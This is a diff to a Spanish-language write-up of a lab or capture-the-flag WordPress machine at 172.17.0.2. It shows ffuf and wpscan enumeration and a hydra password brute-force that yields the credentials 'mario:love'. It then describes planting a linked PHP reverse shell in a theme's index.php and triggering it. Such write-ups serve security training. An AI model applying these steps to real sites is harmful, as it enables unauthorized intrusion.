@@ -56,6 +56,8 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_direc
 wordpress               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
 ```
 
+Enumeramos Wordpress.
+
 ```bash
 wpscan --url 172.17.0.2/wordpress --api-token $WPSCAN_API_TOKEN -e vp,vt
 ```
@@ -101,6 +103,8 @@ hydra -l mario -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rocky
 ```plaintext
 [80][http-post-form] host: 172.17.0.2   login: mario   password: love
 ```
+
+## Exploitation
 
 Dado que tenemos un theme que podemos editar estando en el panel de administración, procedemos a editar el theme twentytwentytwo agegando una [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) dentro del archivo `index.php`. Una vez agregado el contenido de la reverse shell dentro del archivo `index.php` presionamos `Update File` para guardar los cambios, nos ponemos en escucha en la máquina atacante y forzamos la ejecución del archivo ingresando a `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/`.
 
